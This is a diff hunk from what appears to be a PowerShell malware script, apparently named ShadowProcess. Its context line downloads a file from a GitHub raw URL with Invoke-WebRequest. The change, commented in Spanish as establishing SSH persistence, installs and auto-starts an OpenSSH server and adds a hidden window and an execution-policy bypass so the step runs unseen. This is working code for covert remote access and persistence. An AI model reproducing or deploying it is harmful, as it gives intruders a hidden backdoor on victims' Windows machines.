@@ -55,7 +55,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/re
 
 cd $path
 # estableciendo persistencia ssh
-powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'
+powershell powershell.exe -windowstyle hidden -ep bypass Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'
 
 
 
